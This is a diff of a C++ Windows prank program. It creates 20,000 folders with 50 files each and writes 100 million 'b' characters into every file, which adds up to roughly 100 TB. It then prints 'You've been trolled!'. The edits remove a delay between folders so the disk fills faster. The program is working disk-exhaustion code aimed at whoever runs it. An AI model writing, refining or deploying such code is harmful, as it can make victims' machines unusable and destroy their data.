@@ -1,4 +1,4 @@
-#include <iostream>
+﻿#include <iostream>
 #include <filesystem>
 #include <fstream>
 #include <windows.h>
@@ -35,16 +35,19 @@ void create_mainfolder(const filesystem::path& base_path) {
 }
 
 // Function to create secondary folders
-void create_secondary_folders(const filesystem::path& base_path) {
+void create_files(const filesystem::path& base_path) {
     for (int folder_num = 1; folder_num <= 20000; ++folder_num) {
         filesystem::path folder_path = base_path / ("Beans_" + to_string(folder_num));
         filesystem::create_directories(folder_path);
-        cout << "\nFolders created:\n [" << folder_num << "/20000]\n";
+        cout << "\nFolders created:\n [" << folder_num << "/20000]\n\n";
         // Create files in the folder
         for (int file_num = 1; file_num <= 50; ++file_num) {
             filesystem::path file_path = folder_path / ("Beans_" + to_string(file_num) + ".txt");
             ofstream file(file_path);
-            file << string(1000000000, 'b'); // 10000 * 100000, 
+            
+            
+            file << string(100000000, 'b');
+             
             file.close();
             if (file_num < 10) {
                 cout << "File: " << " [0" << file_num << "/50]\n";
@@ -53,14 +56,14 @@ void create_secondary_folders(const filesystem::path& base_path) {
                 cout << "File: " << " [" << file_num << "/50]\n";
             }
         }
-        wait(1);
+        //wait(1);
     }
 }
 
 int main() {
     filesystem::path base_path = "BeansFolders";
     create_mainfolder(base_path);
-    create_secondary_folders(base_path);
+    create_files(base_path);
     cout << "You've been trolled!\n";
     return 0;
 }
